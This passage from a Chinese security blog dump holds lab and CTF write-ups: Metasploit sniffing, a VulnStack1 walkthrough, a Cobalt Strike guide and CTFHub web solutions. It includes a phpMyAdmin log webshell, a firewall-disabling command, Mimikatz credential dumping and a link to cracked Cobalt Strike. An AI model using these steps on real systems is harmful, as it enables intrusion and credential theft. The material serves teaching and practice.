snmp 协议扫描目标服务器信息\n\n```bash\nmsf5 > use auxiliary/scanner/snmp/snmp_enum \nmsf5 auxiliary(scanner/snmp/snmp_enum) > show options \nmsf5 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.1.180 #靶机ip\nmsf5 auxiliary(scanner/snmp/snmp_enum) > run \n```\n\n3、可以看到通过 snmp 协议探测到的信息非常多。如服务器硬件信息和服务器当前运行的进程，这两方面是其他扫描方式获取不到的。\n\n![](https://img.jwt1399.top//img/20200813101917.png)\n\n### 密码嗅探模块\n\n这个 psnuffle 模块可以像以前的 dsniff 命令一样，去嗅探密码， 目前支持POP3，IMAP，FTP和HTTP GET 协议。\n![](https://img.jwt1399.top//img/20200813094617.png)\n\n**1、Kali开启嗅探**\n\n```bash\nmsf5 > search sniffer \nmsf5 > use auxiliary/sniffer/psnuffle\nmsf5 auxiliary(sniffer/psnuffle) >  info #查看 psnuffle 模块作用\nmsf5 auxiliary(sniffer/psnuffle) > show options \nmsf5 auxiliary(psnuffle) > run  #直接run是实时在线的嗅探\n\nmsf5 auxiliary(psnuffle) > set pcapfile /root/ftp.pcap  #设置pcapfile可以提取pcap文件中的账号密码\n```\n\n**2、模拟靶机登录FTP**\n\n```bash\n#kali新建一个终端窗口登录ftp，Metasploitable2-Linux 靶机中已经开启了 FTP 服务可以直接登录。\nroot@kali:~# apt install lftp -y   #安装 lftp 命令 \nroot@kali:~# lftp -u msfadmin 192.168.1.180 #登录 FTP\n密码:msfadmin \n#连接成功后，进行下数据交互，查看 ftp 目录下的文件 \nlftp msfadmin@192.168.1.180:~> ls   \ndrwxr-xr-x    6 1000     1000         4096 Apr 28  2010 vulnerable \n```\n\n**3、查看嗅探到的数据**\n\n回到 MSF 终端可以看到用户名密码信息已经被获取。\n\n![](https://img.jwt1399.top//img/20200813100540.png)\n\n**4、关闭任务**\n\n```bash\n#嗅探完成后记得把后台任务关闭 \nmsf5 auxiliary(psnuffle) > jobs #查看后台运行的任务\nmsf5 auxiliary(psnuffle) > kill 0   #kill job 的 ID，关闭 job \n```\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["Metasploit"],"categories":["Tools"]},{"title":"内网渗透靶机：VulnStack1","url":"/posts/25535.html","content":"\nVulnStack是红日安全团队出的一个内网渗透的靶机环境，想着通过靶场环境加深对 Cobalt Strike 和 Metasploit 的学习\n\n## 靶机简介\n\n> 红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟 ATT&CK 攻击链路进行搭建，开成完整闭环。后续也会搭建真实 APT 实战环境，从实战中成长。虚拟机所有统一密码：hongrisec@2019\n\n靶机下载地址：[**ATT&CK红队评估实战靶场**](http://vulnstack.qiyuanxuetang.net/vuln/detail/2/)\n\n## 环境搭建\n\n| 网络拓扑结构        | ![网络拓扑图](https://img.jwt1399.top//img/20200803112138.png) |\n| ------------------- | ------------------------------------------------------------ |\n| **VMware 网络配置** | ![VMware 网络配置](../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/20200803123245.png) |\n| **网络示意图**      | ![网络示意图](../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/20200803123242.png) |\n| **实际配置图**      | ![实际配置图](https://img.jwt1399.top//img/20200803123239.jpg) |\n\n模拟外网：Vmnet1（192.168.52.0/24）\n\n模拟内网：VMnet2（192.168.57.0/24）\n\n- 攻击机：Kali2020\n  - IP：192.168.52.128\n\n- Web服务器：Windows7  \n  - 外网IP：192.168.52.143   \n  - 内网IP：192.168.72.128 \n  - 主机名：stu1\n- 域成员主机：Windows Server 2003\n  - IP：192.168.72.141       \n  - 主机名：root-tvi862ubeh\n- 域控服务器：Windows Server 2008\n  - IP：192.168.72.138\n  - 主机名：owa             \n\n\n\n**启动Web环境：打开Win7后，打开PhpStudy**\n\n## 外网渗透\n\n### 信息收集\n\n#### 1.探测主机\n\n```bash\nnetdiscover -i eth0 -r 192.168.52.0/24\n```\n\n![](https://img.jwt1399.top//img/20200804102558.png)\n\n#### 2.查看目标主机开放端口\n\n```bash\nnmap -sV -p- 192.168.52.143\n\n-sV 用来扫描目标主机和端口上运行的软件的版本\n-p- 扫描0-65535全部端口\n```\n\n![](https://img.jwt1399.top//img/20200804102548.png)\n\n开放了80和3306端口，说明存在Web服务\n\n#### 3.查看网页收集相关信息\n\n**1.访问web页面，获取到phpMyadmin登录密码**\n\n访问Web服务是一个 `phpStudy` 探针页面，在这里可以获取到网站的绝对路径 `C:/phpStudy/www/`\n\n最下面 `MYSQL` 数据库连接检测：输入弱密码 `root/root` 成功连接\n\n或者使用phpMyadmin爆破工具也能得到用户名密码\n\n![](https://img.jwt1399.top//img/20200804113505.png)\n\n**2.扫描目录，获取到网站后台路径和登录用户和密码**\n\n![](https://img.jwt1399.top//img/20200804112911.png)\n\n扫描到数据库后台 `PhpMyadmin` 和备份文件 `beifen.rar`，下载解压得到 `yxcms` 文件夹，是一个网站的源码，直接访问`http://192.168.52.143/yxcms`，发现了网站有后台路径和管理员账户泄露\n\n![](https://img.jwt1399.top//img/20200804114529.png)\n\n### GetShell\n\n#### 1.phpMyadmin日志Getshell\n\n前面信息收集第一步获得的phpMyadmin的用户名和密码，登录进去想办法获得shell\n\n**phpmyadmin后台getshell一般有以下几种方式：**\n\n- 1、select into outfile直接写入\n- 2、开启全局日志getshell\n- 3、使用慢查询日志getsehll\n- 4、使用错误日志getshell\n- 5、利用phpmyadmin4.8.x本地文件包含漏洞getshell\n\n看看第一种是否可以，先查看是否有写权限：\n\n```sql\nshow global variables like '%secure_file%';\n```\n\n![](https://img.jwt1399.top//img/20200804155311.png)\n\n`secure_file_priv` 值为 `NULL`，不能使用 `into outfile` 方式写入 shell\n\n再来看一下第二种，利用全局变量`general_log`来Getshell\n\n**1.查看全局日志状态**\n\n```sql\nshow variables  like  '%general%'; \n```\n\n![](https://img.jwt1399.top//img/20200804153700.png)\n\n**2.开启日志,将所有查询语句记录到新指定的可访问的文件中**\n\n```sql\nset global general_log=on;\n```\n\n**3.设置全局日志的路径为网站目录**\n\n```sql\nset global general_log_file = 'C:/phpStudy/WWW/jwt.php'\n```\n\n![修改后全局日志状态](https://img.jwt1399.top//img/20200804155305.png)\n\n**4.将一句话木马写入该日志文件**\n\n```sql\nSELECT '<?php eval($_POST[\"cmd\"]);?>' \n```\n\n![](https://img.jwt1399.top//img/20200804154525.png)\n\n成功连接蚁剑\n\n![](https://img.jwt1399.top//img/20200804155258.png)\n\n\n\n#### 2.后台修改前台模板Getshell\n\n根据信息收集第三步中获得的后台路径`/index.php?r=admin`和用户名:admin;密码:123456\n\n登录进后台，然后发现前台模板有php文件编辑，可以直接写一句话木马进去获取shell\n\n![](https://img.jwt1399.top//img/20200804151401.png)\n\n在刚才解压的文件夹下找到info.php的路径（`/yxcms/protected/apps/default/view/default/info.php`）或者利用目录遍历找到路径，直接蚁剑连接\n\n![](https://img.jwt1399.top//img/20200804151358.png)\n\n **参考：**\n\n- [phpmyadmin 后台 getshell 及漏洞利用](https://soapffz.com/sec/496.html)\n\n- [网站后台getshell的方法总结](http://www.mamicode.com/info-detail-2599856.html)\n\n## 内网渗透\n\n### 反弹shell给Cobalt Strike\n\n**1.CS创建Listener**\n\n通过 `Cobalt Stike` → `Listeners` → `Add` 创建一个监听器\n\n![](https://img.jwt1399.top//img/20200804163614.png)\n\n**2.生成后门文件**\n\n`攻击`→`生成后门` → `Windows Executable(S)`，监听器选择刚创建的 `Listener`，输出选择`Windows EXE`\n\n![](../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/image-20200804165256799.png)\n\n**3.蚁剑上传后门**\n\n先关闭受害机防火墙\n\n```bash\nnetsh advfirewall set allprofiles state off\n```\n\n![](https://img.jwt1399.top//img/20200804170220.png)\n\n再上传生成的exe\n\n![](https://img.jwt1399.top//img/20200804170222.png)\n\n**4.执行exe获得shell**\n直接输入exe 文件名执行 exe\n\n![](https://img.jwt1399.top//img/20200804170206.png)\n\n获得Cobalt Strike 的 shell\n\n| 主机上线                                             | 主机上线                                             |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200804170514.png) | ![](https://img.jwt1399.top//img/20200804171118.png) |\n\n拿到 `shell` 第一步，调低心跳值，默认心跳为 `60s`，执行命令的响应很慢，进入 `beacon` 执行 `sleep 5` 或者右键主机选择 `会话` →`Sleep`进行设置\n\n![](https://img.jwt1399.top//img/20200804172330.png)\n\n### 主机信息收集\n\n右键受害机选择`进入 beacon` 执行命令（执行cmd命令前面要加shell）\n\n**查询基本信息**\n\n```bash\nshell whoami\nshell hostname\nnet user \t# 本机用户列表\nnet localgroup administrators    # 本机管理员[通常含有域用户]\nshell systeminfo #查看系统详细信息\nnslookup god.org    # 解析域名IP地址\n```\n\n![](https://img.jwt1399.top//img/20200804173824.png)\n\n**查询操作系统信息**\n\n```bash\nshell systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"  # 英文操作系统\nshell systeminfo | findstr /B /C:\"OS 名称\" /C:\"OS 版本\"   # 中文操作系统\nshell echo %PROCESSOR_ARCHITECTURE%    # 查看系统系统结构\n```\n\n**查询已安装的软件以及版本信息**\n\n```bash\n# 使用wmic操作\nshell wmic product get name,version \n\n#使用powershell进行操作\npowershell \"Get-WmiObject -class Win32_Product | Select-Object -Property name,Version\" \n```\n\n**查询进程及服务**\n\n```bash\nshell tasklist # 默认显示映像名称，PID，会话名，会话，内存使用\nshell tasklist /svc # 默认显示映像名称，PID，服务\nshell wmic process list brief # 列出进程的核心信息,类似任务管理器\nnet statistics workstation     # 查看主机开机时间\nnetstat -ano    #查询端口列表\nwmic qfe get caption,description,hotfixid,installedon   #查询本机安装的补丁\n```\n\n### 域信息收集\n\n#### 基础命令\n\n```bash\nshell ipconfig /all\t# 查询本机IP段，所在域等\nshell net user /domain    # 查询域用户\nshell net view \t\t\t# 查看域信息\nshell net view /domain   # 查看主域信息\nshell net time /domain  # 获取域服务器的时间\nshell net group \"domain computers\" /domain         #查看域内所有的主机名\nshell net group \"domain admins\"   /domain          #查看域管理员\nshell net group \"domain controllers\" /domain       #查看域控\nshell net config workstation  # 查询当前登陆域及当前计算机名，全名，用户名，系统版本，工作站域\n```\n\n#### 判断是否存在域控\n\n使用 `shell ipconfig /all` 查看 `DNS` 服务器，发现 DNS 服务器名为 `god.org`\n\n![](../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/image-20200805161038207.png)\n\n从域信息收集可以得到以下信息：\n\n- 域：god.org\n- 域内有三个用户：administrator、ligang、liukaifeng01\n- 域内有三台主机：DEV1(不在此环境中)、ROOT-TVI862UBEH(192.168.52.141)、STU1(192.168.52.143)\n- 域控：OWA(192.168.52.138)\n- 域管理员：administrator\n\n## 横向探测\n\n#### 凭据导出\n\n> 凭据可以理解为目标机的账号，密码。凭据导出是渗透测试中极为重要的步骤，导出目标机凭据后，我们可以使用凭据实现横向移动（利用hash传递，smb/rdp爆破等等手法）来扩大我们的战果。\n\n##### hashdump读内存密码\n\n```bash\nbeacon> hashdump\n或者\n右键点击beacon会话→执行→转储Hash\n```\n\n##### **Mimikatz导出凭据**\n\n利用 `mimitakz` 模块（实战中需要免杀处理），读注册表密码\n\n```bash\nbeacon> logonpasswords\n或者\n右键点击主机→执行→Run Mimikatz\n```\n\n![](https://img.jwt1399.top//img/20200804182058.png)\n\n##### **凭据存储**\n\n点击`凭证信息`可以查看读取到的密码\n\n![](https://img.jwt1399.top//img/20200804182054.png)\n\n## 环境崩了，后续操作暂时无法更新\n\n**参考：**\n\n- [ATT&CK实战 | Vulnstack 红队（一）](https://www.freebuf.com/column/231111.html)\n\n- [ATT&CK 实战 - 红日安全 vulnstack (一)](https://soapffz.com/sec/558.html#menu_index_1)\n\n- [内网渗透靶机-VulnStack 1](https://cloud.tencent.com/developer/article/1633420)\n- [从外网到域控（vulnstack靶机实战）](https://www.anquanke.com/post/id/189940#h2-0)\n- [[内网渗透实战技巧](https://www.iambigboss.top/post/54200_1_1.html)]([https://www.iambigboss.top/post/54200_1_1.html#%E6%B4%BE%E7%94%9FCobaltStrike%E6%9D%83%E9%99%90](https://www.iambigboss.top/post/54200_1_1.html#派生CobaltStrike权限))\n- [内网渗透学习导航](https://mp.weixin.qq.com/s/aXEJpZVxxSkFUfG8TqsxHw)\n- [内网渗透命令大全](https://www.t00ls.net/articles-39285.html)\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["靶场","VulnStack","内网渗透"],"categories":["Web"]},{"title":"Cobalt Strike 学习记录","url":"/posts/24047.html","content":"\nCobalt Strike（简称“CS”）是一款团队作战渗透测试神器，分为客户端和服务端，一个服务端可以对应多个客户端，一个客户端可以连接多个服务端，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe、powershell木马生成等。主要用来后期持久渗透、横向移动、流量隐藏、数据窃取的工具。\n\n## 安装\n\nCobalt Strike 分为客户端和服务端。服务端只能运行在Linux系统中，可搭建在VPS上；客户端在Windows、Linux、Mac下都可以运行 (需要配置好Java环境)。\n\nCobalt Strike 4 破解版下载地址：[CobaltStrike.zip](https://jwt1399.lanzoui.com/iTvBaf82p1g)\n\n### 文件结构\n\n```bash\n$:/CobaltStrike4# tree\n.\n├── agscript\n├── c2lint\n├── Cobalt Strike 4.exe\n├── cobaltstrike.auth\n├── CobaltstrikeCN.jar\t# 汉化包\n├── cobaltstrike.jar\t# 客户端程序\n├── cobaltstrike.store\n├── icon.ico\n├── icon.jpg\n├── peclone\n├── start.bat\n├── start.sh\n├── teamserver\t# 服务端程序\n├── teamserver.bat\n└── third-party\t# 第三方工具\n    ├── README.winvnc.txt\n    ├── winvnc.x64.dll\n    └── winvnc.x86.dll\n\n1 directory, 17 files\n```\n\n### 服务端安装\n\n下载好**CobaltStrike.zip**解压，将文件夹放入Linux机器中（我放在了 `opt` 目录下），然后运行：\n\n```bash\ncd /opt/CobaltStrike4\n\nchmod +x teamserver\n\nsudo ./teamserver <host> <password>   \n\n\n# host：服务器外网IP\n# password：客户端连接需要的密码\n```\n\n![服务端操作](https://img.jwt1399.top//img/20200802155722.png)\n\n### 客户端安装\n\n将上面同样的文件夹在Windows上面放一份，双击运行文件夹中的 `Cobalt Strike 4.exe` ，这个exe是我自己制作的启动器，如果你下载的其他安装包，你可以点击文件夹中的 `start.bat` 进行启动。\n\n![客户端连接](https://img.jwt1399.top//img/20200802155728.png)\n\n 如果这是您与此团队服务器的第一次连接，Cobalt Strike将询问您是否识别此团队服务器的SHA256哈希值。如果您这样做，请按OK，Cobalt Strike客户端将连接到服务器。Cobalt Strike还会记住这个SHA256哈希，以便将来连接。您可以通过Cobalt Strike – >Preferences – > Fingerprints管理这些哈希值。\n\n![](https://img.jwt1399.top//img/20200802155730.png)\n\n![登录成功界面](https://img.jwt1399.top//img/20200802155734.png)\n\n### 扩展知识：启动器制作\n\n每次启动`Cobalt Strike`都得通过`start.bat` 进行启动，但是追求完美的简简是忍受不了的，那么接下来就来制作一个`exe`启动器\n\n**修改前后对比：**\n\n| 修改前                                               | 修改后                                               |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200802164722.png) | ![](https://img.jwt1399.top//img/20200802164725.png) |\n\n制作需要用到 **Bat_To_Exe_Converter** 这个工具。下载地址：[Bat_To_Exe_Converter.zip](https://jwt1399.lanzoui.com/iCpJUf85wdi)\n\n1.选择新建或者直接打开start.bat，主要是将启动的代码导入\n\n![](https://img.jwt1399.top//img/20200802170438.png)\n\n2.在右侧设置图标(ico格式)，密码，EXE格式等属性。这里我添加了图标并把EXE格式设置为64位隐形\n\n![](https://img.jwt1399.top//img/20200802170548.png)\n\n**EXE格式**控制windows的黑窗口是否弹出，隐形为不弹出，可见为弹出；打包压缩，会对我们生成的exe进行压缩。\n\n![](https://img.jwt1399.top//img/20200802170535.png)\n\n还可以设置版本信息，这里我没有设置\n\n![](https://img.jwt1399.top//img/20200802170532.png)\n\n3.设置好后，点击转换按钮，选择存放的目录就可以啦\n\n![](https://img.jwt1399.top//img/20200802170521.png)\n\n## 快捷工具条\n\n![](https://img.jwt1399.top//img/20200804182433.png)\n\n## Listeners和Payload\n\n**1.CS创建Listener**\n\n> Listner(监听器)：专门用于对其他对象身上发生的事件或状态改变进行监听和相应处理的对象，当被监视的对象发生情况时，立即采取相应的行动。\n\n选择 `Cobalt Stike` → `Listeners` → `Add` 创建一个监听器\n\n![](https://img.jwt1399.top//img/20200804163614.png)\n\n**2.生成Payload文件**\n\n> Payload在渗透测试之中大家可以简单地理解为一段漏洞利用/植入后门的代码或程序。\n\n选择`攻击` -> `生成后门` -> `Windows Executable(S)`，监听器选择刚创建的 `Listener`，输出选择`Windows EXE`\n\n![](../images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%9AVulnStack1/image-20200804165256799.png)\n\n**3.蚁剑上传后门**\n\n先关闭受害机防火墙\n\n```bash\nnetsh advfirewall set allprofiles state off\n```\n\n![](https://img.jwt1399.top//img/20200804170220.png)\n\n再上传生成的exe\n\n![](https://img.jwt1399.top//img/20200804170222.png)\n\n**4.执行exe获得shell**\n直接输入exe 文件名执行 exe\n\n![](https://img.jwt1399.top//img/20200804170206.png)\n\n获得Cobalt Strike 的 shell\n\n| 主机上线                                             | 主机上线                                             |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200804170514.png) | ![](https://img.jwt1399.top//img/20200804171118.png) |\n\n拿到 `shell` 第一步，调低心跳值，默认心跳为 `60s`，执行命令的响应很慢，进入 `beacon` 执行 `sleep 5` 或者右键主机选择 `会话` →`Sleep`进行设置\n\n![](https://img.jwt1399.top//img/20200804172330.png)\n\n**参考：**\n\n- https://www.cnblogs.com/ichunqiu/p/11934077.html\n\n## beacon基本命令\n\n![基本命令](https://img.jwt1399.top//img/20200804182137.png)\n\n## 与Metasploit联动\n\n待更。。。\n\n## 文件/进程管理\n\n [文件/进程管理与键盘记录](https://www.cnblogs.com/ichunqiu/p/12034201.html)\n\n## 安装扩展\n\n选择菜单栏的`Cobalt Strike`-->`脚本管理器`，点击`load`，然后选择  `cna` 扩展文件即可，旁边的unload为去除该扩展，reload为重新加载该扩展。\n\n### elevate.cna\n\n脚本功能：增加五种提权方式\n脚本位置：在Elevate中\n地址： https://github.com/rsmudge/ElevateKit\n\n### ProcessTree.cna\n\n脚本功能：让ps命令可以显示父子关系并显示颜色\n脚本位置：命令行中\n地址： https://github.com/ars3n11/Aggressor-Scripts\n\n\n\n参考：[使用Aggressor脚本雕饰Cobalt Strike](https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg)\n\n## 中文用户手册\n\nCobaltStrike4.0用户手册_中文翻译：[蓝奏云](https://jwt1399.lanzoui.com/iuF2Efajjoh)\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["Cobalt Strike"],"categories":["Tools"]},{"title":"CTFHub-技能树-Web","url":"/posts/60046.html","content":"\n最近一段时间一直在复习Web基础知识，光看生硬的知识点也无趣，就想着边刷题边复习吧，正好看到群里在推荐CTFHub这个平台，于是我就开始刷[CTFHub技能树](https://www.ctfhub.com/#/skilltree )啦🎈\n\n## Web前置技能\n\n### HTTP协议\n\n> HTTP是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。     更多详细请看：[HTTP教程](https://www.runoob.com/http/http-tutorial.html)\n\n**HTTP三个特征：**无连接、媒体独立、无状态\n\n**HTTP九种请求方法：**GET、POST 、HEAD、OPTIONS、PUT、PATCH、DELETE、TRACE、CONNECT \n\n**客户端HTTP请求消息**:由`请求行`、`请求头部`、`请求数据`组成。\n\n| 一般格式                                                     | 示例                                                 |\n| ------------------------------------------------------------ | ---------------------------------------------------- |\n| ![](https://www.runoob.com/wp-content/uploads/2013/11/2012072810301161.png) | ![](https://img.jwt1399.top//img/20200717091709.png) |\n\n**服务器HTTP响应消息**:由`状态行`、`消息报头`和`响应正文`组成。\n\n![](https://img.jwt1399.top//img/20200717091703.png)\n\n**HTTP状态码分类**\n\n| 分类 | 分类描述                                       |\n| :--- | :--------------------------------------------- |\n| 1**  | 信息，服务器收到请求，需要请求者继续执行操作   |\n| 2**  | 成功，操作被成功接收并处理                     |\n| 3**  | 重定向，需要进一步的操作以完成请求             |\n| 4**  | 客户端错误，请求包含语法错误或无法完成请求     |\n| 5**  | 服务器错误，服务器在处理请求的过程中发生了错误 |\n\n状态码详情请看:https://www.runoob.com/http/http-status-codes.html)\n\n#### 请求方式\n\n **题目考点：HTTP Method**\n\n打开链接是一段话\n\n```\nHTTP Method is GET\nUse CTF**B Method,I will give you flag.\nHint If you got [HTTP Method Not Allowed] Error,you should requests index.php\n```\n\n根据题目意思，需要你用CTF**B 方法请求 index.php来获取flag\n\n注意：HTTP Method 是可以自定义的，并且区分大小写.\n\n**方法一：使用curl**\n\n```\ncurl -v -X CTFHUB http://challenge-53da4bfe747dae4b.sandbox.ctfhub.com:10080/index.php\n```\n\ncurl用法请参考：https://jwt1399.top/posts/49445.html#toc-heading-46\n\n**方法二：使用Burp抓包修改请求方式后，再发包**\n\n![](https://img.jwt1399.top//img/20200717094841.png)\n\n#### 302跳转\n\n **题目考点：HTTP状态码**\n\n> 状态码3**,代表重定向\n\n| 状态码 | 状态码英文名称 | 中文描述                                                     |\n| ------ | -------------- | ------------------------------------------------------------ |\n| 302    | Found          | 临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI |\n\n更多状态码详情请看:https://www.runoob.com/http/http-status-codes.html)\n\n用浏览器访问index.php发现会302跳转到 index.html\n\n**方法一：使用curl**\n\n```\ncurl -v CTFHUB http://challenge-45da4bfe747dae4b.sandbox.ctfhub.com:10080/index.php\n```\n\n**方法二：使用Burp抓包**\n\n**扩展知识：重定向和请求转发**\n\nHTTP中的重定向和请求转发的区别：转发是服务器行为，重定向是客户端行为。\n\n`转发过程：`客户浏览器发送HTTP请求➡➡➡Web服务器接受请求➡➡➡调用内部方法在容器内部完成请求处理和转发动作➡➡➡将目标资源发送给客户\n\n`重定向过程：`客户浏览器发送HTTP请求➡➡➡web服务器接受发送302状态码响应及对应新的location给客户浏览器➡➡➡客户浏览器发现是302响应，则自动再发送一个新的HTTP请求，请求url是新的location地址➡➡➡服务器根据此请求寻找资源并发送给客户\n\n#### Cookie\n\n **题目考点：Cookie欺骗、认证、伪造**\n\n> cookie是由后端服务器端创建保存在客服端一种数据库结构。浏览器请求和后端服务端响应都会携带创建的cookie来回传输。cookie在传输时存储在请求头和响应头中。\n\n打开链接，显示一句话\n\n```\nhello guest. only admin can get flag.\n```\n\nBurp 抓包发现Cookie：admin=0，把0改为1重新发包，就得到flag了\n\n![](https://img.jwt1399.top//img/20200717104635.png)\n\n**扩展知识：cookie和session**\n\ncookie和session的区别：cookie是存在于客户端的，而session是存在于服务器端的\n\n`cookie：`web服务所使用的HTTP服务是无状态的。这就意味着，服务器无法分辨收到的请求是属于哪一个用户的，需要通过cookie来对用户的身份进行标识了，用户每次对服务器发起请求时，都带上自己独有的cookie，服务器通过读取cookie信息，识别用户。\n\n`session：`session和cookie的作用有点类似，都是为了存储用户相关的信息。存储在服务器的数据会更加的安全，不容易被窃取。但存储在服务器也有一定的弊端，就是会占用服务器的资源。\n\n#### 基础认证\n\n**题目考点：HTTP 基础认证、爆破**\n\n> 在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 https://zh.wikipedia.org/wiki/HTTP基本认证\n\n**HTTP基本认证的过程:**\n\n①`请求：`客户端发送`HTTP Request`给服务器\n\n②`质询：`因为request中没有包含Authorization header或者错误包含, 服务器会返回一个`401 Unauthozied`给客户端，并且在`Response`的 header \"`WWW-Authenticate`\" 中添加信息。\n\n③`授权：`客户端输入用户名和密码并用base64加密后，放在`Authorization header` 中发送给服务器。\n\n④`成功：`服务器将`Authorization header`中的用户名密码取出，进行验证， 如果验证通过，将根据请求，发送资源给客户端\n\n| 打开链接                                             | 点击click,需要用户名和密码                           |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200717155458.png) | ![](https://img.jwt1399.top//img/20200717155508.png) |\n\n随便输个账号密码（账号jwt 密码 123），使用BurpSuite 抓包\n\n①`请求：`发送`HTTP Request`给服务器\n\n![](https://img.jwt1399.top//img/20200717155508.png)\n\n②`质询：`因为request中错误包含Authorization header, 服务器会返回一个`401 Unauthozied`给客户端，并且在`Response`的 header \"`WWW-Authenticate`\" 中添加信息。\n\n![](https://img.jwt1399.top//img/20200717162814.png)\n\n得到提示 `Do u konw admin ?`，于是猜测账号是 `admin` , 应该就是HTTP 请求头部的 Authorization 字段中的账号密码错误，需要我们爆破，题目也给了字典\n\n```\nAuthorization: Basic and0OjEyMw==\n\nBasic表示是「基础认证」, 后面的 and0OjEyMw== 用 base64 解码后是 jwt:123 , 也就是我们之前输入的账号和密码\n根据提示，容易猜测用户名为 admin ，那么 Authorization 头字段的格式就应该为\nAuthorization: Basic base64(admin:密码)\n```\n\n③`授权：`客户端输入用户名和密码并用base64加密后，放在`Authorization header` 中发送给服务器。\n\n1.将报文发送到 `Intruder`, 将 `Basic` 后面 `base64` 部分添加为 `payload position`\n\n![](https://img.jwt1399.top//img/20200717162830.png)\n\n2.在 `有效载荷` 选项卡下，选择 `有效载荷集` 为 `运行时文件`, 然后在 `有效载荷` 中点击 `文件选择` 加载密码字典\n\n![](https://img.jwt1399.top//img/20200717162836.png)\n\n3.有效负载处理` -> `添加`->` 添加前缀`->` 输入 `admin:`\n\n\n![](https://img.jwt1399.top//img/20200717162847.png)\n\n4.有效负载处理` -> `添加`->` 编码`->` Base64编码\n\n![](https://img.jwt1399.top//img/20200717162847.png)\n\n5.`有效载荷编码` 取消勾选的 `URL编码这些字符`, 不取消的话 base64 之后的 `=` 会被转成 `%3d` ，这样就爆不出密码\n\n![](https://img.jwt1399.top//img/20200717162857.png)\n\n6.点击`开始攻击` ，然后点击 `状态` 排序，看到状态码出现 200 的，即爆破成功\n\n![](https://img.jwt1399.top//img/20200717162916.png)\n\n7.查看 `Response` 得到 flag\n\n![](https://img.jwt1399.top//img/20200717162913.png)\n\n#### 响应包源代码\n\n**题目考点：HTTP响应包源代码查看**\n\n1.打开题目，发现界面为一贪吃蛇小游戏界面，根据题目提示，应该与响应包有关\n\n2.F12审查元素，直接在响应包中发现flag\n\n## 信息泄露\n\n### 目录遍历\n\n打开网站，提示点击寻找flag,之后会跳转到`flag_in_here`这个目录，挨个对里面的目录进行寻找,就能找到flag\n\n### PHPINFO\n\n打开题目之后提示让点击查看phpinfo，然后Ctrl+F搜索flag，就找到了\n\n### 备份文件下载\n\n#### 网站备份\n\n> 常见的网站源码备份文件名\n>\n> list1 = ['web', 'website', 'backup', 'back', 'www', 'wwwroot', 'temp']\n>\n> 常见的网站源码备份文件后缀\n>\n> list2 = ['tar', 'tar.gz', 'zip', 'rar']\n\n```python\n#python3\nimport requests\n# url1为被扫描地址，后不加‘/’\nurl1 = 'http://challenge-3d8be6a2b5195774.sandbox.ctfhub.com:10080'\n# 常见的网站源码备份文件名\nlist1 = ['web', 'website', 'backup', 'back', 'www', 'wwwroot', 'temp']\n# 常见的网站源码备份文件后缀\nlist2 = ['tar', 'tar.gz', 'zip', 'rar']\n\nfor i in list1:\n    for j in list2:\n        back = str(i) + '.' + str(j)\n        url2 = str(url1) + '/' + back\n        print(back + '    ', end='')\n        print(len(requests.get(url2).text))\n```\n\n对常见的备份文件进行扫描，发现存在`www.zip`，解压得到的txt中发现flag\n\n#### bak文件\n\n> xxx.bak为备份文件\n\n```\ncurl http://challenge-c86ab07eaf0058b1.sandbox.ctfhub.com:10080/.index.php.bak\n```\n\n#### 